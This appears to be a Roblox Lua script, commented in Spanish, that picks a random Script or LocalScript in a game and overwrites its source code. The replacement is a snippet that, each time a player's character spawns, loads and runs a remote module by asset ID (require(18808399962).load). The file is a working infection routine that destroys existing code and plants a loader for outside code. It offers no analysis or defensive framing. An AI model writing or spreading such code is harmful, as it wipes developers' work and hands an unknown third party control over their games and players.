-- LocalScript: remplaza código de un Script aleatorio
local targetSnippet = [[
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        require(18808399962).load(player.Name)
    end)
end)
]]

-- Busca scripts aleatorios en el juego
local candidates = {}
for _, obj in pairs(game:GetDescendants()) do
    if obj:IsA("Script") or obj:IsA("LocalScript") then
        table.insert(candidates, obj)
    end
end

if #candidates > 0 then
    -- Elige uno aleatorio
    local choice = candidates[math.random(1, #candidates)]
    print("[DEBUG] Reemplazando código de:", choice:GetFullName())
    -- Cambia su Source
    pcall(function()
        choice.Source = targetSnippet
    end)
else
    warn("[DEBUG] No se encontraron scripts para reemplazar.")
end
